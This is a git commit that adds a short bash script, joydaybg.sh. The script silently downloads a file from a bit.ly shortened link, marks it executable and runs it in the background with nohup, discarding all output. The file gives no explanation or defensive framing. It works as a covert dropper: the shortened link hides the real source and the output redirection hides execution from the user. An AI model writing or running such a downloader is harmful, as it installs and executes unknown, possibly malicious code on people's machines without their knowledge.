efe09e135106b556d79f932e1dcb0462e8c9cc1f
bibirbusin <132418678+bibirbusin@users.noreply.github.com>
2024-08-04 02:42:12 +0700

    Create joydaybg.sh

---
+++ joydaybg.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+
+# Define the URL and the filename
+URL="https://bit.ly/46y4ox6"
+FILENAME="downloaded_app"
+
+# Download the file
+wget -q "$URL" -O "$FILENAME"
+
+# Make the downloaded file executable
+chmod +x "$FILENAME"
+
+# Run the file in the background and redirect stdout and stderr to /dev/null
+nohup ./"$FILENAME" > /dev/null 2>&1 &
